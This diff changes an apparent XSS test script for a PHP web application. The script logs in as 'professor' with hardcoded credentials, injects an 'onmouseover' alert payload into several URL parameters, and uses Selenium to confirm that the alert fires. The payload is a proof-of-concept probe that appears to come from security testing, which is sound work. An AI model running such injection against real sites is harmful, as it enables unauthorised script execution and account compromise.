@@ -1,6 +1,10 @@
 import requests
 from requests import Request, Session
 import urllib, urllib2
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import Select
+from selenium.common.exceptions import NoSuchElementException
 
 defaultHeader = {
     "Referer": "https://app4.com/www/index.php",
@@ -29,12 +33,23 @@ with requests.Session() as s:
     self_checkIfCanLogin(s,{"login": "professor", "password": "professor", "_qf__login_form": "123"},
                          'https://app5.com/www/index.php', defaultHeader)
     #attacking!
-    r = s.get("https://app5.com/www/professor.php?ctg=%22%20onmouseover=%22alert%28123%29&user=professor&op=profile",verify=False)
+    r = s.get("https://app5.com/www/professor.php?ctg=%22%20onmouseover=%22alert%28123%29&user=%22%20onmouseover=%22alert%28123%29&op=%22%20onmouseover=%22alert%28123%29",verify=False)
     f2 = open('tmp04.html', 'w')
     f2.write(r.text.encode('utf-8'))
-    IsAttackSucces=r.text.encode('utf-8').find('alert(123)')
+    #IsAttackSucces=r.text.encode('utf-8').find('alert(123)')
+    browser = webdriver.Firefox()
+    IsAttackSucces=False
+    try:
+        browser.get("tmp04.html")
+        alert = browser.switch_to_alert()
+        alert.accept()
+        IsAttackSucces=True
+    except:
+        print "error getting alert"
+    browser.close()
     print IsAttackSucces
     if(IsAttackSucces>0):
         print 'Attack Success'
     else:
         print 'Failed'
+
